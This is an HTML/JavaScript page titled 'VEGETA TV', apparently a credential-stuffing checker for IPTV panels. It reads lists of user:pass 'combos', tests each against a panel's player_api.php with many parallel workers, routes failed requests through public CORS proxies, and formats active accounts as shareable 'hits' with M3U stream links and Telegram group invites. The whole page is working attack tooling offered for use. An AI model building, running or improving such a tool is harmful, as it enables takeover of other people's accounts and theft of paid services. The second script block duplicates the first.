<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>VEGETA TV</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
  :root {
    --cyan: #00fff7;
    --cyan-shadow: 0 0 8px #00fff7;
    --cyan-shadow-2: 0 0 16px #00fff7;
    --cyan-shadow-3: 0 0 20px #00fff7, 0 0 35px #00fff7;
    --dark-bg: #000;
    --input-bg: #111;
  }
  body {
    background: var(--dark-bg);
    color: var(--cyan);
    font-family: 'Orbitron', monospace, monospace;
    margin: 0;
    padding: 20px;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }
  h1 {
    text-align: center;
    font-size: 2rem;
    color: var(--cyan);
    text-shadow:
      0 0 5px var(--cyan),
      0 0 10px var(--cyan),
      0 0 20px var(--cyan),
      0 0 30px var(--cyan),
      0 0 40px var(--cyan);
    border: 2px solid var(--cyan);
    border-radius: 12px;
    padding: 12px 20px;
    margin-bottom: 20px;
    user-select: none;
  }
  label {
    font-weight: bold;
    margin-top: 15px;
    display: block;
    color: var(--cyan);
    text-shadow: 0 0 5px var(--cyan);
  }
  input[type="text"],
  input[type="number"],
  input[type="file"] {
    background: var(--input-bg);
    border: 2px solid var(--cyan);
    border-radius: 10px;
    box-shadow: 0 0 8px var(--cyan) inset;
    color: var(--cyan);
    font-family: 'Orbitron', monospace;
    font-size: 1rem;
    padding: 10px;
    width: 100%;
    max-width: 500px;
    box-sizing: border-box;
    transition: border-color 0.3s, box-shadow 0.3s;
  }
  input[type="text"]:focus,
  input[type="number"]:focus,
  input[type="file"]:focus {
    border-color: #41fffa;
    box-shadow: 0 0 15px var(--cyan) inset;
    outline: none;
  }
  button {
    margin-top: 15px;
    padding: 12px 20px;
    max-width: 500px;
    font-size: 1.1rem;
    font-weight: bold;
    font-family: 'Orbitron', monospace;
    color: var(--dark-bg);
    background: var(--cyan);
    border: 2px solid var(--cyan);
    border-radius: 10px;
    cursor: pointer;
    box-shadow: var(--cyan-shadow-2);
    transition: background-color 0.3s, box-shadow 0.3s;
    user-select: none;
  }
  button:hover:not(:disabled) {
    background: #41fffa;
    border-color: #41fffa;
    box-shadow: 0 0 28px var(--cyan);
  }
  button:disabled {
    background: #222;
    border-color: #033;
    box-shadow: none;
    color: #044;
    cursor: not-allowed;
  }
  #progressContainer {
    margin-top: 20px;
    max-width: 500px;
    border: 2px solid var(--cyan);
    border-radius: 10px;
    padding: 10px;
    box-shadow: var(--cyan-shadow-2);
    user-select: none;
  }
  #progressBar {
    background: var(--input-bg);
    border-radius: 10px;
    height: 20px;
    overflow: hidden;
  }
  #progressBarFill {
    background: var(--cyan);
    height: 100%;
    width: 0%;
    transition: width 0.3s ease;
  }
  #progressText {
    margin-top: 5px;
    font-size: 14px;
    color: var(--cyan);
    text-shadow: 0 0 5px var(--cyan);
  }
  #hitsCount {
    margin-top: 15px;
    max-width: 900px;
    font-weight: bold;
    color: var(--cyan);
    text-shadow: 0 0 8px var(--cyan);
  }
  #hitsContainer {
    margin-top: 15px;
    max-width: 900px;
    flex-grow: 1;
    overflow-y: auto;
    background: var(--input-bg);
    padding: 15px;
    border-radius: 15px;
    font-size: 14px;
    box-shadow: var(--cyan-shadow-2);
    color: var(--cyan);
  }
  .hit-block {
    border: 2px solid var(--cyan);
    padding: 12px;
    margin-bottom: 12px;
    border-radius: 12px;
    background: var(--dark-bg);
    cursor: pointer;
    transition: background 0.3s, box-shadow 0.3s;
    display: flex;
    flex-direction: column;
  }
  .hit-block:hover {
    background: #033642;
    box-shadow: var(--cyan-shadow-3);
  }
  .hit-header {
    font-weight: bold;
    margin-bottom: 6px;
    color: #00fff7;
    text-shadow: 0 0 8px #00fff7;
  }
  .hit-content {
    white-space: pre-wrap;
    color: #41fffa;
    text-shadow: 0 0 4px #00fff7;
  }
  .copy-btn {
    align-self: flex-start;
    margin-top: 8px;
    padding: 6px 12px;
    font-size: 0.85rem;
    color: var(--dark-bg);
    background: var(--cyan);
    border: 2px solid var(--cyan);
    border-radius: 8px;
    cursor: pointer;
    box-shadow: 0 0 10px var(--cyan);
    user-select: none;
    transition: background-color 0.3s, box-shadow 0.3s;
    width: fit-content;
  }
  .copy-btn:hover {
    background: #41fffa;
    border-color: #41fffa;
    box-shadow: 0 0 18px var(--cyan);
  }
  /* Scrollbar cyan neon */
  #hitsContainer::-webkit-scrollbar {
    width: 12px;
  }
  #hitsContainer::-webkit-scrollbar-thumb {
    background: var(--cyan);
    border-radius: 10px;
    box-shadow: 0 0 8px var(--cyan);
  }
  #hitsContainer::-webkit-scrollbar-track {
    background: var(--dark-bg);
  }
  /* Firefox scrollbar cyan */
  #hitsContainer {
    scrollbar-color: #00fff7 #000;
    scrollbar-width: thin;
  }
</style>
</head>
<body>

<h1>VEGETA TV</h1>

<label for="hostInput">Panel (host con o sin http/https):</label>
<input type="text" id="hostInput" placeholder="ej: lista.com:8080" autocomplete="off" />

<label for="comboFile">Elige archivo .txt con combos (user:pass):</label>
<input type="file" id="comboFile" accept=".txt" />

<label for="comboTextarea">O pega aqu√≠ tus combos (user:pass, uno por l√≠nea):</label>
<textarea id="comboTextarea" rows="6" style="background:#111; border:2px solid #00fff7; border-radius:10px; box-shadow:0 0 8px #00fff7 inset; color:#00fff7; font-family:'Orbitron', monospace; font-size:1rem; padding:10px; width:100%; max-width:500px; box-sizing:border-box; margin-top:6px;"></textarea>

<div id="comboCount" style="margin-top:6px; font-size:14px; color:#41fffa; font-family:'Orbitron', monospace;"></div>

<label for="concurrencyInput">N√∫mero de conexiones paralelas (bots):</label>
<input type="number" id="concurrencyInput" min="1" max="50" value="20" />

<button id="startBtn" disabled>Iniciar Validaci√≥n</button>
<button id="stopBtn" disabled>Detener Scan</button>
<button id="copyBtn" disabled>Copiar Hits Encontrados</button>

<div id="progressContainer" aria-label="Progreso de la validaci√≥n">
  <div id="progressBar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
    <div id="progressBarFill"></div>
  </div>
  <div id="progressText">Esperando inicio...</div>
</div>

<div id="hitsCount" aria-live="polite" aria-atomic="true">Hits encontrados: 0</div>

<div id="hitsContainer" aria-live="polite" aria-atomic="true" aria-relevant="additions"></div>

<footer style="text-align:center; margin-top:30px; font-size:12px; color:#00fff7; font-family: 'Orbitron', monospace; user-select:none;">Hecho por VEGETA TV</footer>

<script>
  const hostInput = document.getElementById('hostInput');
  const comboFile = document.getElementById('comboFile');
  const concurrencyInput = document.getElementById('concurrencyInput');
  const startBtn = document.getElementById('startBtn');
  const stopBtn = document.getElementById('stopBtn');
  const copyBtn = document.getElementById('copyBtn');
  const hitsContainer = document.getElementById('hitsContainer');
  const progressBarFill = document.getElementById('progressBarFill');
  const progressText = document.getElementById('progressText');
  const hitsCount = document.getElementById('hitsCount');

  let combos = [];
  let hits = [];
  let totalCombos = 0;
  let processedCount = 0;
  let isRunning = false;
  let stopRequested = false;

  function limpiarHost(host) {
    host = host.trim();
    if (host.startsWith('http://')) host = host.slice(7);
    else if (host.startsWith('https://')) host = host.slice(8);
    return host;
  }

  function actualizarProgreso() {
    const percent = totalCombos === 0 ? 0 : (processedCount / totalCombos) * 100;
    progressBarFill.style.width = percent + '%';
    progressText.textContent = `Procesados: ${processedCount} / ${totalCombos} | Hits: ${hits.length}`;
    progressBarFill.setAttribute('aria-valuenow', percent.toFixed(0));
    hitsCount.textContent = `Hits encontrados: ${hits.length}`;
  }

  async function fetchTimeout(resource, options = {}) {
    const { timeout = 10000 } = options;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
      const response = await fetch(resource, { ...options, signal: controller.signal });
      clearTimeout(id);
      return response;
    } catch (e) {
      clearTimeout(id);
      throw e;
    }
  }

  
  async function fetchWithFallback(host, user, pass) {
    const urls = [
      `http://${host}/player_api.php?username=${user}&password=${pass}`,
      `https://${host}/player_api.php?username=${user}&password=${pass}`,
      `https://api.allorigins.win/raw?url=http://${host}/player_api.php?username=${user}&password=${pass}`,
      `https://corsproxy.io/?http://${host}/player_api.php?username=${user}&password=${pass}`
    ];
    for (const url of urls) {
      try {
        const res = await fetch(url, { method: 'GET' });
        if (res.ok) return await res.json();
      } catch(e) { continue; }
    }
    return null;
  }


  async function validarCombo(host, combo) {
    try {
      if (stopRequested) return null;
      const [user, pass] = combo.split(':');
      if (!user || !pass) return null;

      const dataUser = await fetchWithFallback(host, user, pass);
      if (!dataUser || !(dataUser.user_info && dataUser.user_info.status === 'Active')) return null;

      const info = dataUser.user_info;
      const creada = new Date(info.created_at * 1000).toLocaleDateString('es-ES') || 'Desconocida';
      const expira = new Date(info.exp_date * 1000).toLocaleDateString('es-ES') || 'Desconocida';
      const statusEmoji = info.status === 'Active' ? '‚úÖ' : '‚ùå';
      const status = info.status || 'Desconocido';
      const porta = host.includes(':') ? host.split(':')[1] : '80';
      const hostSemPorta = host.includes(':') ? host.split(':')[0] : host;
      const linkM3U = `http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;

      const texto = `‚ö° VEGETA TV ‚ö° 
üåêHost: ${hostSemPorta}
üö™Puerto: ${porta}
üë§Usuario: ${user}
üîëContrase√±a: ${pass}
üìÖCreada: ${creada}
‚è≥Expira: ${expira}
${statusEmoji}Estado: ${status}
üîóLink M3U: ${linkM3U}
üó£Grupo: https://t.me/+japhlpdroyYzYWJk
üó£Grupo: https://t.me/+XmT5CjFVOIJmNjc0`;

      return { texto, user, pass, host };
    } catch {
      return null;
    }
  }


  function mostrarHit(hit) {
    const div = document.createElement('div');
    div.className = 'hit-block';
    div.tabIndex = 0;
    div.setAttribute('role', 'button');
    div.setAttribute('aria-label', `Usuario ${hit.user} Contrase√±a ${hit.pass}`);

    const header = document.createElement('div');
    header.className = 'hit-header';
    header.textContent = `Usuario: ${hit.user} | Contrase√±a: ${hit.pass}`;
    div.appendChild(header);

    const content = document.createElement('pre');
    content.className = 'hit-content';
    content.textContent = hit.texto;
    div.appendChild(content);

    // Bot√≥n copiar
    const copyButton = document.createElement('button');
    copyButton.className = 'copy-btn';
    copyButton.textContent = 'Copiar';
    copyButton.title = 'Copiar este hit';
    copyButton.addEventListener('click', (e) => {
      e.stopPropagation();
      navigator.clipboard.writeText(hit.texto).then(() => {
        // feedback visual simple
        copyButton.textContent = '¬°Copiado!';
        setTimeout(() => copyButton.textContent = 'Copiar', 1500);
      }).catch(() => {
        alert('No se pudo copiar.');
      });
    });
    div.appendChild(copyButton);

    hitsContainer.prepend(div);
  }

  async function processarCombos(host, combos, concurrencia) {
    hitsContainer.textContent = '';
    hits = [];
    totalCombos = combos.length;
    processedCount = 0;
    isRunning = true;
    stopRequested = false;
    actualizarProgreso();

    let index = 0;

    async function worker() {
      while (index < totalCombos && !stopRequested) {
        const i = index++;
        const combo = combos[i];
        const hit = await validarCombo(host, combo);
        processedCount++;
        if (hit) {
          hits.push(hit);
          mostrarHit(hit);
        }
        actualizarProgreso();
      }
    }

    const workers = [];
    for (let i = 0; i < concurrencia; i++) {
      workers.push(worker());
    }
    await Promise.all(workers);

    isRunning = false;
    if(stopRequested){
      progressText.textContent += ' | Scan detenido por el usuario.';
    } else {
      progressText.textContent += ' | Validaci√≥n finalizada.';
    }
    copyBtn.disabled = hits.length === 0;
    startBtn.disabled = false;
    stopBtn.disabled = true;
  }

  function refreshStartButton() {
    const hostOk = hostInput.value.trim().length > 0;
    const combosOk = combos.length > 0;
    startBtn.disabled = !(hostOk && combosOk) || isRunning;
  }

  hostInput.addEventListener('input', refreshStartButton);

  comboFile.addEventListener('change', () => {
    combos = [];
    hitsContainer.textContent = '';
    copyBtn.disabled = true;
    const file = comboFile.files[0];
    if (!file) {
      startBtn.disabled = true;
      return;
    }
    const reader = new FileReader();
    reader.onload = e => {
      combos = e.target.result.split(/\r?\n/).map(l => l.trim()).filter(l => l);
      refreshStartButton();
    };
    reader.readAsText(file);
  });

  startBtn.addEventListener('click', () => {
    if (isRunning) return;
    startBtn.disabled = true;
    copyBtn.disabled = true;
    stopBtn.disabled = false;
    hitsContainer.textContent = '';
    progressText.textContent = 'Iniciando validaci√≥n...';
    const host = limpiarHost(hostInput.value);
    const concurrencia = parseInt(concurrencyInput.value) || 20;
    processarCombos(host, combos, concurrencia);
  });

  stopBtn.addEventListener('click', () => {
    if(!isRunning) return;
    stopRequested = true;
    stopBtn.disabled = true;
    progressText.textContent += ' | Deteniendo validaci√≥n...';
  });

  copyBtn.addEventListener('click', () => {
    if (hits.length === 0) return;
    const texto = hits.map(h => h.texto).join('\n\n------------------------------\n\n');
    navigator.clipboard.writeText(texto).then(() => {
      alert('¬°Hits copiados al portapapeles!');
    }).catch(() => {
      alert('No se pudo copiar los hits.');
    });
  });

  // Mostrar cu√°ntos combos se cargaron en iOS y forzar refresco
  const comboCount = document.getElementById('comboCount');
  function updateComboCount() {
    comboCount.textContent = combos.length > 0 ? `Combos cargados: ${combos.length}` : 'Ning√∫n combo cargado';
  }

  // Sobrescribir el lector de archivo para a√±adir setTimeout
  comboFile.addEventListener('change', () => {
    combos = [];
    hitsContainer.textContent = '';
    copyBtn.disabled = true;
    const file = comboFile.files[0];
    if (!file) {
      startBtn.disabled = true;
      updateComboCount();
      return;
    }
    const reader = new FileReader();
    reader.onload = e => {
      combos = e.target.result.split(/\r?\n/).map(l => l.trim()).filter(l => l);
      updateComboCount();
      refreshStartButton();
      setTimeout(refreshStartButton, 500); // ‚ö° Forzar actualizaci√≥n en iOS
    };
    reader.readAsText(file);
  });

  // Tambi√©n refrescar cuando cambie el host
  hostInput.addEventListener('input', () => {
    refreshStartButton();
    setTimeout(refreshStartButton, 200); // ‚ö° Forzar actualizaci√≥n en iOS
  });


  // Permitir combos pegados manualmente en textarea
  const comboTextarea = document.getElementById('comboTextarea');
  comboTextarea.addEventListener('input', () => {
    if (comboTextarea.value.trim().length > 0) {
      combos = comboTextarea.value.split(/\r?\n/).map(l => l.trim()).filter(l => l);
    } else {
      combos = [];
    }
    updateComboCount();
    refreshStartButton();
  });

</script>


<script>
document.addEventListener("DOMContentLoaded", () => {
  const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const concInput = document.getElementById('concurrencyInput');
  if (isIOS) {
    concInput.max = 20;
    concInput.value = 10;
  } else {
    concInput.max = 100;
  }
});

  // Mostrar cu√°ntos combos se cargaron en iOS y forzar refresco
  const comboCount = document.getElementById('comboCount');
  function updateComboCount() {
    comboCount.textContent = combos.length > 0 ? `Combos cargados: ${combos.length}` : 'Ning√∫n combo cargado';
  }

  // Sobrescribir el lector de archivo para a√±adir setTimeout
  comboFile.addEventListener('change', () => {
    combos = [];
    hitsContainer.textContent = '';
    copyBtn.disabled = true;
    const file = comboFile.files[0];
    if (!file) {
      startBtn.disabled = true;
      updateComboCount();
      return;
    }
    const reader = new FileReader();
    reader.onload = e => {
      combos = e.target.result.split(/\r?\n/).map(l => l.trim()).filter(l => l);
      updateComboCount();
      refreshStartButton();
      setTimeout(refreshStartButton, 500); // ‚ö° Forzar actualizaci√≥n en iOS
    };
    reader.readAsText(file);
  });

  // Tambi√©n refrescar cuando cambie el host
  hostInput.addEventListener('input', () => {
    refreshStartButton();
    setTimeout(refreshStartButton, 200); // ‚ö° Forzar actualizaci√≥n en iOS
  });


  // Permitir combos pegados manualmente en textarea
  const comboTextarea = document.getElementById('comboTextarea');
  comboTextarea.addEventListener('input', () => {
    if (comboTextarea.value.trim().length > 0) {
      combos = comboTextarea.value.split(/\r?\n/).map(l => l.trim()).filter(l => l);
    } else {
      combos = [];
    }
    updateComboCount();
    refreshStartButton();
  });

</script>

</body>
</html>